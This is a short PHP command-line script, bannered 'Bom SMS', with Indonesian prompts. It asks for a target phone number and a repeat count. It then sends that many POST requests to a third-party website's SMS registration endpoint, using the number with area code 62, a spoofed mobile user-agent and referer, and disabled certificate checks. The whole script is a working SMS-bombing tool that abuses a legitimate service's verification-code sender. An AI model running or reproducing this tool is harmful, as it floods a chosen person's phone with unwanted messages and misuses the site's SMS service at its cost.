<?php
function curl($a, $ua, $nmr = null){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "https://www.sharedmp.com/api/sms/send?event=register&mobile=".$nmr."&area_code=62" );
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_COOKIEFILE, 'cok.txt');
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_HTTPHEADER, $ua);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	$result = curl_exec($ch);
	return $result;
}
$ua = array(
"user-agent: Mozilla/5.0 (Linux; Android 6.0.1; SM-J500G Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36",
"content-type: application/x-www-form-urlencoded",
"referer: https://www.sharedmp.com/h5/pages/register/register?invcode=170835",
    );
echo "
╭━━━╮╱╱╭╮╱╱╱╱╱╱╱╱╭╮╱╭┳━━━┳╮╱╭╮
┃╭━╮┃╱╱┃┃╱╱╱╱╱╱╱╱┃┃╱┃┃╭━╮┃┃╱┃┃
┃╰━╯┣━━┫┃╭┳┳━╮╭━━┫╰━╯┃┃┃┃┃╰━╯┃
┃╭━━┫┃━┫╰╯╋┫╭╮┫╭╮┣━━╮┃┃┃┃┣━━╮┃
┃┃╱╱┃┃━┫╭╮┫┃┃┃┃╰╯┃╱╱┃┃╰━╯┃╱╱┃┃
╰╯╱╱╰━━┻╯╰┻┻╯╰┻━╮┃╱╱╰┻━━━╯╱╱╰╯
╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭━╯┃
╱╱╱╱╱╱╱╱╱╱╱╱╱╱╰━━╯Bom SMS";

echo "\n\n[+]Nomor [Jangan pake 62/0]: ";
$nmr = trim(fgets(STDIN));
echo "[+]Brapa?:  ";
$brp = trim(fgets(STDIN));
echo "\n";
for ($a = 0; $a < $brp; $a++){
$gas = curl($a, $ua, $nmr);
echo "$gas\n";
}
?>
